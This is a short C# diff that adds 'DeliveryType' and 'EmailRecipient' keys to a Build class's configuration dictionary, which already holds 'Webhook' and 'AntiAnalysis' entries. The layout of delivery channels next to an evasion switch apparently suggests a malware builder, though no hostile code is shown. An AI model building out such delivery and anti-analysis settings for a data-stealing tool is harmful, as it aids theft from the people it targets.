@@ -10,6 +10,8 @@ internal sealed class Build
     public static Dictionary<string, string> ConfigValues = new()
     {
         {"Webhook", ""},
+        {"DeliveryType", ""},
+        {"EmailRecipient", ""},
         {"Debug", ""},
 
         {"AntiAnalysis", ""},
